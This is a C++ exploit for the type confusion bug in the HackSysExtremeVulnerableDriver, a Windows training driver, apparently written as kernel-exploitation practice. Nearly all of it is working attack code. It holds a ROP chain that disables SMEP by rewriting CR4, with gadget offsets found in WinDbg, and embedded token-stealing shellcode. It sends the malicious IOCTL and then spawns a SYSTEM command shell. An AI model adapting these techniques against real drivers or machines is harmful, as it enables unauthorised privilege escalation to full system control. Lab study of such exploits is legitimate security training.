#include <iostream>
#include <windows.h>
#include <ntstatus.h>
#include <string>
#include <Psapi.h>
#include <vector>
#pragma comment(lib, "ntdll.lib")

#define QWORD uint64_t

typedef enum _SYSTEM_INFORMATION_CLASS {
    SystemBasicInformation = 0,
    SystemPerformanceInformation = 2,
    SystemTimeOfDayInformation = 3,
    SystemProcessInformation = 5,
    SystemProcessorPerformanceInformation = 8,
    SystemModuleInformation = 11,
    SystemInterruptInformation = 23,
    SystemExceptionInformation = 33,
    SystemRegistryQuotaInformation = 37,
    SystemLookasideInformation = 45
} SYSTEM_INFORMATION_CLASS;

typedef struct _SYSTEM_MODULE_INFORMATION_ENTRY {
    HANDLE Section;
    PVOID MappedBase;
    PVOID ImageBase;
    ULONG ImageSize;
    ULONG Flags;
    USHORT LoadOrderIndex;
    USHORT InitOrderIndex;
    USHORT LoadCount;
    USHORT OffsetToFileName;
    UCHAR FullPathName[256];
} SYSTEM_MODULE_INFORMATION_ENTRY, * PSYSTEM_MODULE_INFORMATION_ENTRY;

typedef struct _SYSTEM_MODULE_INFORMATION {
    ULONG NumberOfModules;
    SYSTEM_MODULE_INFORMATION_ENTRY Module[1];
} SYSTEM_MODULE_INFORMATION, * PSYSTEM_MODULE_INFORMATION;

typedef NTSTATUS(NTAPI* _NtQuerySystemInformation)(
    SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
    );

// Function pointer typedef for NtDeviceIoControlFile
typedef NTSTATUS(WINAPI* LPFN_NtDeviceIoControlFile)(
    HANDLE FileHandle,
    HANDLE Event,
    PVOID ApcRoutine,
    PVOID ApcContext,
    PVOID IoStatusBlock,
    ULONG IoControlCode,
    PVOID InputBuffer,
    ULONG InputBufferLength,
    PVOID OutputBuffer,
    ULONG OutputBufferLength
    );

typedef struct USER_CONTROLLED_OBJECT {
    INT64 ObjectID;
    INT64 ObjectType;
};

typedef struct _SMEP {
    INT64 STACK_PIVOT;
    INT64 POP_RCX;
    INT64 MOV_CR4_RCX;
} SMEP;

HMODULE ntdll = LoadLibraryA("ntdll.dll");
// Get the address of NtDeviceIoControlFile
LPFN_NtDeviceIoControlFile NtDeviceIoControlFile = reinterpret_cast<LPFN_NtDeviceIoControlFile>(
    GetProcAddress(ntdll, "NtDeviceIoControlFile"));

HANDLE setupSocket() {
    // Open a handle to the target device
    HANDLE deviceHandle = CreateFileA(
        "\\\\.\\HackSysExtremeVulnerableDriver",
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        nullptr,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        nullptr
    );
    if (deviceHandle == INVALID_HANDLE_VALUE) {
        //std::cout << "[-] Failed to open the device" << std::endl;
        FreeLibrary(ntdll);
        return FALSE;
    }
    return deviceHandle;
}

INT64 GetKernelBase() {
    DWORD len;
    PSYSTEM_MODULE_INFORMATION ModuleInfo;
    PVOID kernelBase = NULL;
    _NtQuerySystemInformation NtQuerySystemInformation = (_NtQuerySystemInformation)
        GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtQuerySystemInformation");
    if (NtQuerySystemInformation == NULL) {
        return NULL;
    }
    NtQuerySystemInformation(SystemModuleInformation, NULL, 0, &len);
    ModuleInfo = (PSYSTEM_MODULE_INFORMATION)VirtualAlloc(NULL, len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!ModuleInfo) {
        return NULL;
    }
    NtQuerySystemInformation(SystemModuleInformation, ModuleInfo, len, &len);
    kernelBase = ModuleInfo->Module[0].ImageBase;
    VirtualFree(ModuleInfo, 0, MEM_RELEASE);
    return (INT64)kernelBase;
}

SMEP SMEPBypass = { 0 };
int SMEPBypassInitializer() {
    INT64 NT_BASE_ADDR = GetKernelBase(); // ntoskrnl.exe 
    std::cout << std::endl << "[+] NT_BASE_ADDR: 0x" << std::hex << NT_BASE_ADDR << std::endl;

    INT64 STACK_PIVOT = NT_BASE_ADDR + 0x002ce4c0;
    SMEPBypass.STACK_PIVOT = STACK_PIVOT;
    std::cout << "[+] STACK_PIVOT: 0x" << std::hex << STACK_PIVOT << std::endl;

    /*
        1 - kd> lm m nt
            Browse full module list
            start             end                 module name
            fffff800`51200000 fffff800`52247000   nt         (export symbols)       ntkrnlmp.exe

        2 - .writemem "C:/MyDump.dmp" fffff80051200000 fffff80052247000
        3 - python3 .\ROPgadget.py --binary C:\MyDump.dmp --ropchain --only "mov|pop|add|sub|xor|ret" > rop.txt
        *******************************************************************************
        kd> lm m nt
            Browse full module list
            start             end                 module name
            fffff800`51200000 fffff800`52247000   nt         (export symbols)       ntkrnlmp.exe

        kd> s fffff800`51200000 L?01047000 BC 00 00 00 48 83 C4 28 C3
            fffff800`514ce4c0  bc 00 00 00 48 83 c4 28-c3 cc cc cc cc cc cc cc  ....H..(........
            fffff800`51ef8500  bc 00 00 00 48 83 c4 28-c3 01 a8 02 75 06 48 83  ....H..(....u.H.
            fffff800`51ef8520  bc 00 00 00 48 83 c4 28-c3 cc cc cc cc cc cc cc  ....H..(........

        kd> u nt!ExfReleasePushLock+0x20
            nt!ExfReleasePushLock+0x20:
            fffff800`514ce4c0 bc00000048      mov     esp,48000000h
            fffff800`514ce4c5 83c428          add     esp,28h
            fffff800`514ce4c8 c3              ret

        kd> ? fffff800`514ce4c0 - fffff800`51200000
            Evaluate expression: 2942144 = 00000000`002ce4c0
    */

    INT64 POP_RCX = NT_BASE_ADDR + 0x0021d795;
    SMEPBypass.POP_RCX = POP_RCX;
    std::cout << "[+] POP_RCX: 0x" << std::hex << POP_RCX << std::endl;
    /*
        kd> s fffff800`51200000 L?01047000 41 5C 59 C3
            fffff800`5141d793  41 5c 59 c3 cc b1 02 e8-21 06 06 00 eb c1 cc cc  A\Y.....!.......
            fffff800`5141f128  41 5c 59 c3 cc cc cc cc-cc cc cc cc cc cc cc cc  A\Y.............
            fffff800`5155a604  41 5c 59 c3 cc cc cc cc-cc cc cc cc 48 8b c4 48  A\Y.........H..H

        kd> u fffff800`5141d795
            nt!KeClockInterruptNotify+0x2ff5:
            fffff800`5141d795 59              pop     rcx
            fffff800`5141d796 c3              ret

        kd> ? fffff800`5141d795  - fffff800`51200000
        Evaluate expression: 2217877 = 00000000`0021d795
    */

    INT64 MOV_CR4_RDX = NT_BASE_ADDR + 0x003a5fc7;
    SMEPBypass.MOV_CR4_RCX = MOV_CR4_RDX;
    std::cout << "[+] MOV_CR4_RDX: 0x" << std::hex << POP_RCX << std::endl << std::endl;
    /*
        kd> u  nt!KeFlushCurrentTbImmediately+0x17
            nt!KeFlushCurrentTbImmediately+0x17:
            fffff800`515a5fc7 0f22e1          mov     cr4,rcx
            fffff800`515a5fca c3              ret

        kd> ? fffff800`515a5fc7 - fffff800`51200000
         Evaluate expression: 3825607 = 00000000`003a5fc7
    */
    return TRUE;
}

int exploit() {
    HANDLE sock = setupSocket();
    ULONG outBuffer = { 0 };
    PVOID ioStatusBlock = { 0 };
    ULONG ioctlCode = 0x222023; //HEVD_IOCTL_TYPE_CONFUSION
    // https://vulndev.io/2022/07/10/windows-kernel-exploitation-hevd-x64-type-confusion/
    BYTE sc[256] = {
      0x65, 0x48, 0x8b, 0x04, 0x25, 0x88, 0x01, 0x00, 0x00, 0x48,
      0x8b, 0x80, 0xb8, 0x00, 0x00, 0x00, 0x49, 0x89, 0xc0, 0x4d,
      0x8b, 0x80, 0x48, 0x04, 0x00, 0x00, 0x49, 0x81, 0xe8, 0x48,
      0x04, 0x00, 0x00, 0x4d, 0x8b, 0x88, 0x40, 0x04, 0x00, 0x00,
      0x49, 0x83, 0xf9, 0x04, 0x75, 0xe5, 0x49, 0x8b, 0x88, 0xb8,
      0x04, 0x00, 0x00, 0x80, 0xe1, 0xf0, 0x48, 0x89, 0x88, 0xb8,
      0x04, 0x00, 0x00, 0x65, 0x48, 0x8b, 0x04, 0x25, 0x88, 0x01,
      0x00, 0x00, 0x66, 0x8b, 0x88, 0xe4, 0x01, 0x00, 0x00, 0x66,
      0xff, 0xc1, 0x66, 0x89, 0x88, 0xe4, 0x01, 0x00, 0x00, 0x48,
      0x8b, 0x90, 0x90, 0x00, 0x00, 0x00, 0x48, 0x8b, 0x8a, 0x68,
      0x01, 0x00, 0x00, 0x4c, 0x8b, 0x9a, 0x78, 0x01, 0x00, 0x00,
      0x48, 0x8b, 0xa2, 0x80, 0x01, 0x00, 0x00, 0x48, 0x8b, 0xaa,
      0x58, 0x01, 0x00, 0x00, 0x31, 0xc0, 0x0f, 0x01, 0xf8, 0x48,
      0x0f, 0x07, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
      0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
      0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
      0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
      0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
      0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
      0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
      0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
      0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
      0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
      0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
      0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
      0xff, 0xff, 0xff, 0xff, 0xff, 0xff };

    // Allocating shellcode in a pre-defined address [0x80000000]
    LPVOID shellcode = VirtualAlloc((LPVOID)0x80000000, sizeof(sc), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    RtlCopyMemory(shellcode, sc, 256);

    // Allocating Fake Stack with ROP chain in a pre-defined address [0x48000000]
    LPVOID fakeStack = VirtualAlloc((LPVOID)((INT64)0x48000000 - 0x1000), 0x10000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    // Filling up reserved space memory
    RtlFillMemory((LPVOID)(0x48000000 - 0x1000), 0x1000, 'A');
    QWORD* _fakeStack = reinterpret_cast<QWORD*>((INT64)0x48000000 + 0x28); // add esp, 0x28
    int index = 0;
    _fakeStack[index++] = SMEPBypass.POP_RCX;     // POP RCX
    _fakeStack[index++] = 0x3506f8 ^ 1UL << 20;   // CR4 value (bit flip) 
    _fakeStack[index++] = SMEPBypass.MOV_CR4_RCX; // MOV CR4, RCX
    _fakeStack[index++] = (INT64)shellcode;       // JMP SHELLCODE

    if (VirtualLock(fakeStack, 0x10000)) {
        std::cout << "[+] Address Mapped to Physical Memory" << std::endl;
        USER_CONTROLLED_OBJECT UBUF = { 0 };
        // Malicious user-controlled struct
        UBUF.ObjectID = 0x4141414141414141;
        UBUF.ObjectType = (INT64)SMEPBypass.STACK_PIVOT; // This address will be "[CALL]ed"

        if (NtDeviceIoControlFile((HANDLE)sock, nullptr, nullptr, nullptr, &ioStatusBlock, ioctlCode, &UBUF,
            0x123, &outBuffer, 0x321) != STATUS_SUCCESS) {
            std::cout << "\t[-] Failed to send IOCTL request to HEVD.sys" << std::endl;
        }
        return 0;
    }
}

//https://h0mbre.github.io/HEVD_Stackoverflow_SMEP_Bypass_64bit/
void spawn_shell() {
    std::cout << "\t\t[>] Spawning nt authority/system shell..." << std::endl;
    PROCESS_INFORMATION pi;
    ZeroMemory(&pi, sizeof(pi));
    STARTUPINFOA si;
    ZeroMemory(&si, sizeof(si));
    CreateProcessA("C:\\Windows\\System32\\cmd.exe",
        NULL,
        NULL,
        NULL,
        0,
        CREATE_NEW_CONSOLE,
        NULL,
        NULL,
        &si,
        &pi);
}

/*
WinDBG:
    !sym noisy
    .sympath srv*c:\symbols;C:\HEVD
    .reload /f *.*
    ed nt!Kd_Default_Mask 0xf
    .load C:\windbg_ext\pykd.dll
    .cache flushall
    bp HEVD!TypeConfusionObjectInitializer + 0x37
    g
==============================================
References:
    https://www.coresecurity.com/sites/default/files/2020-06/Windows%20SMEP%20bypass%20U%20equals%20S_0.pdf
    https://kristal-g.github.io/2021/02/20/HEVD_Type_Confusion_Windows_10_RS5_x64.html
    https://ctf101.org/binary-exploitation/return-oriented-programming/
    https://j00ru.vexillium.org/2011/06/smep-what-is-it-and-how-to-beat-it-on-windows/
    https://www.abatchy.com/2018/01/kernel-exploitation-4
    https://vulndev.io/2022/07/14/windows-kernel-exploitation-hevd-x64-use-after-free/
    https://h0mbre.github.io/HEVD_Stackoverflow_SMEP_Bypass_64bit/
    https://github.com/hacksysteam/HackSysExtremeVulnerableDriver/blob/master/Driver/HEVD/Windows/TypeConfusion.c
*/

int main() {
    SMEPBypassInitializer();
    exploit();
    spawn_shell();
    return 0;
}
